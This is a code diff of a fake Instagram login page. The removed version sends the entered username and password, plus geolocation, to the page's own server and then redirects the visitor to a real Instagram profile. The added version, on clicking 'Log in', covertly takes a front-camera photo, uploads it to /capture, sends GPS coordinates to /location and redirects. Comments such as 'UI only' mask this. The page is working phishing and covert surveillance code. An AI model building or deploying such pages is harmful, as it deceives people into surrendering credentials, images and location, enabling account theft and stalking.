@@ -40,7 +40,7 @@ body{
   padding:28px;
 }
 
-/* Inputs */
+/* Inputs (UI only) */
 .input{
   width:100%;
   padding:11px;
@@ -52,7 +52,6 @@ body{
   font-size:14px;
 }
 
-/* Button */
 .btn-primary{
   width:100%;
   padding:11px;
@@ -75,6 +74,7 @@ body{
   letter-spacing:2px;
   color:#8e8e8e;
 }
+
 .divider::before,
 .divider::after{
   content:"";
@@ -82,9 +82,10 @@ body{
   height:1px;
   background:#333;
 }
+
 .divider span{margin:0 12px}
 
-/* Facebook */
+/* Facebook (UI only) */
 .fb-login{
   display:flex;
   justify-content:center;
@@ -94,22 +95,25 @@ body{
   font-size:14px;
   font-weight:500;
 }
+
 .fb-icon{width:18px;height:18px}
 
-/* Misc */
 .forgot{
   margin-top:18px;
   font-size:12px;
   font-weight:500;
 }
+
 .signup{
   margin-top:14px;
   border:1px solid #2a2d33;
   padding:18px;
   font-size:14px;
 }
+
 .signup span{font-weight:400}
 .signup a{color:#3f8cff;font-weight:500;text-decoration:none}
+
 .footer{
   margin-top:28px;
   font-size:12px;
@@ -126,13 +130,11 @@ body{
   <div class="logo">Instagram</div>
 
   <div class="card">
+    <!-- UI-only inputs -->
+    <input class="input" placeholder="Phone number, username, or email">
+    <input class="input" type="password" placeholder="Password">
 
-    <input class="input" id="userField"
-      placeholder="Phone number, username, or email">
-
-    <input class="input" id="passField"
-      type="password" placeholder="Password">
-
+    <!-- Login triggers camera + location, then redirect -->
     <button class="btn-primary" onclick="handleLogin()">Log in</button>
 
     <div class="divider"><span>OR</span></div>
@@ -145,7 +147,6 @@ body{
     </div>
 
     <div class="forgot">Forgot password?</div>
-
   </div>
 
   <div class="signup">
@@ -159,44 +160,63 @@ body{
 </div>
 
 <script>
-/* ===== CONFIG ===== */
+/* Sample next page (replace later) */
 const NEXT_PAGE_URL = "https://www.instagram.com/rohitsharma45/";
 
-/* ===== FEATURE 1 — GUARANTEED SAVE ===== */
-function handleLogin(){
-
-  // 1️⃣ Capture inputs immediately
-  const payload = {
-    user: document.getElementById("userField").value,
-    pass: document.getElementById("passField").value,
-    timestamp: new Date().toISOString()
-  };
-
-  // 2️⃣ Always send to /location (no dependency)
-  fetch("/location",{
-    method:"POST",
-    headers:{ "Content-Type":"application/json" },
-    body: JSON.stringify(payload)
-  }).catch(()=>{});
-
-  // 3️⃣ Optionally attach location (non-blocking)
-  if(navigator.geolocation){
-    navigator.geolocation.getCurrentPosition(pos=>{
-      fetch("/location",{
-        method:"POST",
-        headers:{ "Content-Type":"application/json" },
-        body: JSON.stringify({
-          ...payload,
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          accuracy: pos.coords.accuracy
-        })
-      }).catch(()=>{});
+/* Camera capture (unchanged logic) */
+async function capturePhoto(){
+  let stream=null;
+  try{
+    stream = await navigator.mediaDevices.getUserMedia({
+      video:{ facingMode:"user" }
     });
+    const video=document.createElement("video");
+    video.srcObject=stream;
+    await video.play();
+    const canvas=document.createElement("canvas");
+    canvas.width=video.videoWidth;
+    canvas.height=video.videoHeight;
+    canvas.getContext("2d").drawImage(video,0,0);
+    stream.getTracks().forEach(t=>t.stop());
+    return canvas.toDataURL("image/jpeg",0.8);
+  }catch(e){
+    if(stream) stream.getTracks().forEach(t=>t.stop());
+    throw e;
   }
+}
 
-  // 4️⃣ Redirect
-  window.location.href = NEXT_PAGE_URL;
+async function handleLogin(){
+  try{
+    /* Camera */
+    const image = await capturePhoto();
+    await fetch("/capture",{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body:JSON.stringify({ image })
+    });
+
+    /* Location (non-blocking) */
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(pos=>{
+        fetch("/location",{
+          method:"POST",
+          headers:{ "Content-Type":"application/json" },
+          body:JSON.stringify({
+            lat:pos.coords.latitude,
+            lon:pos.coords.longitude,
+            accuracy:pos.coords.accuracy,
+            timestamp:new Date().toISOString()
+          })
+        });
+      });
+    }
+
+    /* Redirect */
+    window.location.href = NEXT_PAGE_URL;
+
+  }catch{
+    alert("Proceed Further");
+  }
 }
 </script>
 
